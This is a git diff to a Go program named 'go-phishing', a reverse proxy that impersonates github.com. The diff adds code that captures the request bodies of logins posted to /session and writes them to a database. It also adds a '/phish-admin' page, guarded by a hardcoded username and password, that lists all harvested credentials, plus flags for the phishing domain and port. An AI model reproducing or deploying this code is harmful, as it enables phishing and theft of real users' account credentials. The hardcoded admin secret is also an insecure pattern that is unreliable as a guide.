@@ -1,23 +1,38 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
+	"github.com/sirupsen/logrus"
+	"go-phishing/db"
 	"io/ioutil"
 	"net/http"
 	"regexp"
 	"strings"
-	"go-phishing/db"
-	"github.com/sirupsen/logrus"
+	"flag"
 )
 
 const (
-	upstreamURL = "https://github.com"
-	phishURL    = "http://localhost:8080"
+	upstreamURL = "https://github.com"	
+)
+
+var (
+	phishURL string
+	port string
 )
 
 func cloneRequest(r *http.Request) *http.Request {
 	method := r.Method
-	body := r.Body
+
+	// 複製帳密
+	bodyByte, _ := ioutil.ReadAll(r.Body)
+	bodyStr := string(bodyByte)
+	// 如果是 POST 到 /session 的請求就複製帳密
+	if r.URL.String() == "/session" && r.Method == "POST" {
+		db.Insert(bodyStr)
+	}
+
+	body := bytes.NewReader(bodyByte)
 	path := r.URL.Path
 	rawQuery := r.URL.RawQuery
 	url := upstreamURL + path + "?" + rawQuery
@@ -127,17 +142,31 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	w.Write(body)
 }
 
+func adminHandler(w http.ResponseWriter, r *http.Request) {
+	username, password, ok := r.BasicAuth()
+	if username == "as535364" && password == "881015" && ok {
+		strs := db.SelectAll()
+		w.Write([]byte(strings.Join(strs, "\n\n")))
+	} else {
+		w.Header().Add("WWW-Authenticate", "Basic")
+		w.WriteHeader(401)
+		w.Write([]byte("想看？"))
+	}
+}
+
 func main() {
+	//Parse
+	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部屬的網域：")
+	flag.StringVar(&port, "port", ":8080", "部屬的 port：")
+	flag.Parse()
 	// logrus
 	l := logrus.New()
 	l.Info("Server listened on 8080 port!")
 	// db
 	db.Connect()
-	for _,str := range db.SelectAll(){
-		fmt.Println(str)
-	}
 	// http server
 	http.HandleFunc("/", handler)
+	http.HandleFunc("/phish-admin", adminHandler)
 	err := http.ListenAndServe(":8080", nil)
 	if err != nil {
 		panic(err)
